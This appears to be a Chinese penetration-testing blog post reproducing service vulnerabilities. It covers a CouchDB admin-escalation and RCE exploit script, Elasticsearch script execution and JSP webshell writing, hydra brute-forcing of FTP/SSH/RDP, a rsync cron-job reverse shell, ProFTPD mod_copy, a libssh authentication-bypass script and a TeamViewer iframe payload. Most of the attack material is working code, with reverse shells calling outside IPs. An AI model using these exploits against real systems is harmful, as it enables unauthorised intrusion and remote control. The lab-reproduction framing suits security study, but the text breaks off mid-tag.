<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PUT /_users/org.couchdb.user:vulhub HTTP/<span class="number">1.1</span></span><br><span class="line">Host: your-ip:<span class="number">5984</span></span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (compatible; MSIE <span class="number">9.0</span>; Windows NT <span class="number">6.1</span>; Win64; x64; Trident/<span class="number">5.0</span>)</span><br><span class="line">Connection: close</span><br><span class="line">Content-<span class="type">Type</span>: application/json</span><br><span class="line">Content-Length: <span class="number">108</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;type&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;m4ao&quot;</span>,</span><br><span class="line">  <span class="string">&quot;roles&quot;</span>: [<span class="string">&quot;_admin&quot;</span>],</span><br><span class="line">  <span class="string">&quot;roles&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;m4ao&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230718231042057.png" alt="image-20230718231042057"></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230718231126870.png" alt="image-20230718231126870"></p>
<ul>
<li><p>权限绕过-RCE</p>
<p>exp.py</p>
<p><code>注意修改python 中version 版本</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://your-ip:5984&#x27;</span></span><br><span class="line">command = <span class="string">rb&quot;&quot;&quot;sh -i &gt;&amp; /dev/tcp/10.0.0.1/443 0&gt;&amp;1&quot;&quot;&quot;</span></span><br><span class="line">version = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># session.proxies = &#123;</span></span><br><span class="line"><span class="comment">#     &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line">session.put(target + <span class="string">&#x27;/_users/org.couchdb.user:wooyun&#x27;</span>, data=<span class="string">&#x27;&#x27;&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;type&quot;: &quot;user&quot;,</span></span><br><span class="line"><span class="string">  &quot;name&quot;: &quot;wooyun&quot;,</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [&quot;_admin&quot;],</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [],</span></span><br><span class="line"><span class="string">  &quot;password&quot;: &quot;wooyun&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">session.auth = HTTPBasicAuth(<span class="string">&#x27;wooyun&#x27;</span>, <span class="string">&#x27;wooyun&#x27;</span>)</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;bash -c &#x27;&#123;echo,%s&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;</span> % base64.b64encode(command).decode()</span><br><span class="line"><span class="keyword">if</span> version == <span class="number">1</span>:</span><br><span class="line">    session.put(target + (<span class="string">&#x27;/_config/query_servers/cmd&#x27;</span>), data=json.dumps(command))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = session.get(target + <span class="string">&#x27;/_membership&#x27;</span>).json()[<span class="string">&#x27;all_nodes&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">    session.put(target + <span class="string">&#x27;/_node/&#123;&#125;/_config/query_servers/cmd&#x27;</span>.<span class="built_in">format</span>(host), data=json.dumps(command))</span><br><span class="line"></span><br><span class="line">session.put(target + <span class="string">&#x27;/wooyun&#x27;</span>)</span><br><span class="line">session.put(target + <span class="string">&#x27;/wooyun/test&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;_id&quot;: &quot;wooyuntest&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> version == <span class="number">1</span>:</span><br><span class="line">    session.post(target + <span class="string">&#x27;/wooyun/_temp_view?limit=10&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    session.put(target + <span class="string">&#x27;/wooyun/_design/test&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230718232007852.png" alt="image-20230718232007852"></p>
</li>
</ul>
<h3 id="ElasticSearh-文件写入-RCE-漏洞"><a href="#ElasticSearh-文件写入-RCE-漏洞" class="headerlink" title="ElasticSearh-文件写入&amp; RCE-漏洞"></a>ElasticSearh-文件写入&amp; RCE-漏洞</h3><h5 id="一、漏洞简介-6"><a href="#一、漏洞简介-6" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Elasticsearch（以下简称ES）是目前全文搜索引擎的首选。它是一个基于 Lucene 的搜索服务器，提供了一个分布式多用户能力的全文搜索引擎，它同时基于 RESTful Web 接口，可以快速地储存、搜索和分析海量数据。</span><br><span class="line">ES安装部署成功后，默认端口是9200。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">简单介绍一下本测试环境。本测试环境同时运行了Tomcat和ElasticSearch，Tomcat目录在/usr/local/tomcat，web目录是/usr/local/tomcat/webapps；ElasticSearch目录在/usr/share/elasticsearch。</span><br><span class="line"></span><br><span class="line">我们的目标就是利用ElasticSearch，在/usr/local/tomcat/webapps目录下写入我们的webshell。</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230718234629895.png" alt="image-20230718234629895"></p>
<h5 id="二、漏洞复现-4"><a href="#二、漏洞复现-4" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h5><ul>
<li><p>命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">将Java代码放入json中：</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;size&quot;: 1,</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">      &quot;filtered&quot;: &#123;</span><br><span class="line">        &quot;query&quot;: &#123;</span><br><span class="line">          &quot;match_all&quot;: &#123;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;script_fields&quot;: &#123;</span><br><span class="line">        &quot;command&quot;: &#123;</span><br><span class="line">            &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">首先，该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据：</span><br><span class="line"></span><br><span class="line">POST /website/blog/ HTTP/1.1</span><br><span class="line">Host: your-ip:9200</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 25</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;phithon&quot;</span><br><span class="line">&#125;</span><br><span class="line">然后，执行任意代码：</span><br><span class="line"></span><br><span class="line">POST /_search?pretty HTTP/1.1</span><br><span class="line">Host: your-ip:9200</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 343</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;size&quot;: 1,</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">      &quot;filtered&quot;: &#123;</span><br><span class="line">        &quot;query&quot;: &#123;</span><br><span class="line">          &quot;match_all&quot;: &#123;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;script_fields&quot;: &#123;</span><br><span class="line">        &quot;command&quot;: &#123;</span><br><span class="line">            &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>2、直接发包触发执行命令</p>
</li>
<li><p>任意文件读取</p>
<p>首先创建一个恶意索引文档：</p>
</li>
</ul>
<p>​		<code>curl -XPOST http://192.168.110.128:9200/yz.jsp/yz.jsp/1 -d&#39; &#123;&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]&#123;47,116,101,115,116,46,106,115,112&#125;)),new String(new byte[]&#123;114,119&#125;)).write(request.getParameter(new String(new byte[]&#123;102&#125;)).getBytes());%&gt;&quot;:&quot;test&quot;&#125; &#39;</code></p>
<p>再创建一个恶意的存储库，其中<code>location</code>的值即为我要写入的路径。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">园长：这个Repositories的路径比较有意思，因为他可以写到可以访问到的任意地方，并且如果这个路径不存在的话会自动创建。那也就是说你可以通过文件访问协议创建任意的文件夹。这里我把这个路径指向到了tomcat的web部署目录，因为只要在这个文件夹创建目录Tomcat就会自动创建一个新的应用(文件名为wwwroot的话创建出来的应用名称就是wwwroot了)。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST http://192.168.110.128:9200/yz.jsp/yz.jsp/1 -d&#x27;</span><br><span class="line">&#123;&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]&#123;47,116,101,115,116,46,106,115,112&#125;)),new String(new byte[]&#123;114,119&#125;)).write(request.getParameter(new String(new byte[]&#123;102&#125;)).getBytes());%&gt;&quot;:&quot;test&quot;&#125;</span><br><span class="line">&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl -XPUT &#x27;http://192.168.110.128:9200/_snapshot/yz.jsp&#x27; -d &#x27;&#123;</span><br><span class="line">     &quot;type&quot;: &quot;fs&quot;,</span><br><span class="line">     &quot;settings&quot;: &#123;</span><br><span class="line">          &quot;location&quot;: &quot;/usr/local/tomcat/webapps/wwwroot/&quot;,</span><br><span class="line">          &quot;compress&quot;: false</span><br><span class="line">     &#125;</span><br><span class="line">&#125;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl -XPUT &quot;http://192.168.110.128:9200/_snapshot/yz.jsp/yz.jsp&quot; -d &#x27;&#123;</span><br><span class="line">     &quot;indices&quot;: &quot;yz.jsp&quot;,</span><br><span class="line">     &quot;ignore_unavailable&quot;: &quot;true&quot;,</span><br><span class="line">     &quot;include_global_state&quot;: false</span><br><span class="line">&#125;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230719005141349.png" alt="image-20230719005141349"></p>
<h2 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h2><h3 id="FTP-RDP-SSH-口令猜解"><a href="#FTP-RDP-SSH-口令猜解" class="headerlink" title="FTP&amp;RDP&amp;SSH-口令猜解"></a>FTP&amp;RDP&amp;SSH-口令猜解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">hydra是一个自动化的爆破工具，暴力破解弱密码，</span><br><span class="line">是一个支持众多协议的爆破工具，已经集成到KaliLinux中，直接在终端打开即可</span><br><span class="line">-s PORT 可通过这个参数指定非默认端口。</span><br><span class="line">-l LOGIN 指定破解的用户，对特定用户破解。</span><br><span class="line">-L FILE 指定用户名字典。</span><br><span class="line">-p PASS 小写，指定密码破解，少用，一般是采用密码字典。</span><br><span class="line">-P FILE 大写，指定密码字典。</span><br><span class="line">-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。</span><br><span class="line">-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。</span><br><span class="line">-M FILE 指定目标列表文件一行一条。</span><br><span class="line">-o FILE 指定结果输出文件。</span><br><span class="line">-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。</span><br><span class="line">-t TASKS 同时运行的线程数，默认为16。</span><br><span class="line">-w TIME 设置最大超时的时间，单位秒，默认是30s。</span><br><span class="line">-v / -V 显示详细过程。</span><br><span class="line">server 目标ip</span><br><span class="line">service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-&#123;head|get&#125; http-&#123;get|post&#125;-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等。</span><br><span class="line">例子：</span><br><span class="line">FTP：文件传输协议</span><br><span class="line">RDP：Windows远程桌面协议</span><br><span class="line">SSH：Linux安全外壳协议</span><br><span class="line">hydra -L test -P 10top1K.txt 47.110.53.159 ftp -V</span><br><span class="line">hydra -l root -P 10top1K.txt 47.110.53.159 ssh -V</span><br><span class="line">hydra -l administrator -P 10top1K.txt 47.110.53.159 rdp -V</span><br></pre></td></tr></table></figure>

<h3 id="Rsync-文件备份"><a href="#Rsync-文件备份" class="headerlink" title="Rsync 文件备份"></a>Rsync 文件备份</h3><h5 id="一、漏洞简介-7"><a href="#一、漏洞简介-7" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="二、漏洞复现-5"><a href="#二、漏洞复现-5" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h5><p>默认端口 873 未授权判断 <code>rsync rsync://123.58.224.8:10002</code></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230719210141241.png" alt="image-20230719210141241"></p>
<p>利用定时任务反弹shell </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">2.创建文件 </span><br><span class="line">touch shell </span><br><span class="line">#!/bin/bash </span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/47.94.236.117/5566 0&gt;&amp;1</span><br><span class="line">chmod +x shell		</span><br><span class="line">3、上传文件 </span><br><span class="line">rsync -av shell rsync://123.58.236.76:12177/src/etc/cron.hourly </span><br><span class="line">4、等待接受反弹</span><br></pre></td></tr></table></figure>

<p>利用 MSF 批量检测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use auxiliary/scanner/rsync/modules_list</span><br><span class="line">set rhosts file:/root/ips.txt</span><br><span class="line">set threads 10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230719213333339.png" alt="image-20230719213333339"></p>
<h3 id="FTP-Proftpd-搭建-应用软件"><a href="#FTP-Proftpd-搭建-应用软件" class="headerlink" title="FTP&amp;Proftpd 搭建-应用软件"></a>FTP&amp;Proftpd 搭建-应用软件</h3><p>CVE-2015-3306</p>
<h5 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ProFTPD是ProFTPD团队的一套开源的FTP服务器软件。该软件具有可配置性强、安全、稳定等特点。</span><br><span class="line"></span><br><span class="line">ProFTPD 1.3.5中的mod_copy模块允许远程攻击者通过站点cpfr和site cpto命令读取和写入任意文件。任何未经身份验证的客户端都可以利用这些命令将文件从文件系统的任何部分复制到选定的目标。 复制命令使用ProFTPD服务的权限执行，默认情况下，该服务在“nobody”用户的权限下运行。 通过使用/ proc / self / cmdline将PHP有效负载复制到网站目录，可以实现PHP远程代码执行。</span><br></pre></td></tr></table></figure>

<h5 id="二、漏洞复现-6"><a href="#二、漏洞复现-6" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py --host 123.58.224.8 --port 50764 --path &quot;/var/www/html/&quot;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://123.58.236.76:19758/backdoor.php?cmd=id">http://123.58.236.76:19758/backdoor.php?cmd=id</a></p>
<h3 id="libbsh-身份认证绕过"><a href="#libbsh-身份认证绕过" class="headerlink" title="libbsh 身份认证绕过"></a>libbsh 身份认证绕过</h3><h5 id="一、漏洞简介-8"><a href="#一、漏洞简介-8" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">libssh 0.6 及以上的版本，在服务端的代码实现中存在身份认证绕过漏洞。在向服务端认证的流程中，攻击者通过将 SSH2_MSG_USERAUTH_REQUEST 消息替换为 SSH2_MSG_USERAUTH_SUCCESS，即可在无需任何有效凭证的情况下认证成</span><br><span class="line"></span><br><span class="line">0x01 漏洞影响版本</span><br><span class="line">libssh 0.8.x - 0.8.3</span><br><span class="line"></span><br><span class="line">libssh 0.7.x - 0.7.5</span><br><span class="line"></span><br><span class="line">libssh 0.6.x</span><br></pre></td></tr></table></figure>

<h5 id="二、漏洞复现-7"><a href="#二、漏洞复现-7" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h5><p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230719223629543.png" alt="image-20230719223629543"></p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import sys</span><br><span class="line">import paramiko</span><br><span class="line">import socket</span><br><span class="line">import logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)</span><br><span class="line">bufsize = 2048</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def execute(hostname, port, command):</span><br><span class="line">    sock = socket.socket()</span><br><span class="line">    try:</span><br><span class="line">        sock.connect((hostname, int(port)))</span><br><span class="line"></span><br><span class="line">        message = paramiko.message.Message()</span><br><span class="line">        transport = paramiko.transport.Transport(sock)</span><br><span class="line">        transport.start_client()</span><br><span class="line"></span><br><span class="line">        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)</span><br><span class="line">        transport._send_message(message)</span><br><span class="line"></span><br><span class="line">        client = transport.open_session(timeout=10)</span><br><span class="line">        client.exec_command(command)</span><br><span class="line"></span><br><span class="line">        # stdin = client.makefile(&quot;wb&quot;, bufsize)</span><br><span class="line">        stdout = client.makefile(&quot;rb&quot;, bufsize)</span><br><span class="line">        stderr = client.makefile_stderr(&quot;rb&quot;, bufsize)</span><br><span class="line"></span><br><span class="line">        output = stdout.read()</span><br><span class="line">        error = stderr.read()</span><br><span class="line"></span><br><span class="line">        stdout.close()</span><br><span class="line">        stderr.close()</span><br><span class="line"></span><br><span class="line">        return (output+error).decode()</span><br><span class="line">    except paramiko.SSHException as e:</span><br><span class="line">        logging.exception(e)</span><br><span class="line">        logging.debug(&quot;TCPForwarding disabled on remote server can&#x27;t connect. Not Vulnerable&quot;)</span><br><span class="line">    except socket.error:</span><br><span class="line">        logging.debug(&quot;Unable to connect.&quot;)</span><br><span class="line"></span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(execute(sys.argv[1], sys.argv[2], sys.argv[3]))</span><br></pre></td></tr></table></figure>

<p>python exp.py 192.168.110.128 2222 “id”</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230719224051723.png" alt="image-20230719224051723"></p>
<h3 id="向日葵-VNC-Teamviewer"><a href="#向日葵-VNC-Teamviewer" class="headerlink" title="向日葵&amp;VNC&amp;Teamviewer"></a>向日葵&amp;VNC&amp;Teamviewer</h3><h5 id="一、向日葵RCE"><a href="#一、向日葵RCE" class="headerlink" title="一、向日葵RCE"></a>一、向日葵RCE</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-向日葵 RCE</span><br><span class="line">默认端口 40000-60000</span><br><span class="line">xrkRce.exe -h 192.168.8.2 -t scan</span><br><span class="line">xrkRce.exe -h 192.168.46.157 -t rce -p 49712 -c &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230722194645684.png" alt="image-20230722194645684"></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230722194805137.png" alt="image-20230722194805137"></p>
<h5 id="二、VNC-空口令-密码爆破"><a href="#二、VNC-空口令-密码爆破" class="headerlink" title="二、VNC&amp;空口令-密码爆破"></a>二、VNC&amp;空口令-密码爆破</h5><p>MSF 自带测试</p>
<h5 id="三、Teamviewer"><a href="#三、Teamviewer" class="headerlink" title="三、Teamviewer"></a>三、Teamviewer</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;cve-2020-13699&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;p&gt;Welcome to xiaodi!&lt;/p&gt;</span><br><span class="line">    &lt;iframe style=&quot;height:1px;width:1px;&quot; src=&#x27;teamviewer10: --play \\attacker-IP\share\fake.tvs&#x27;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span 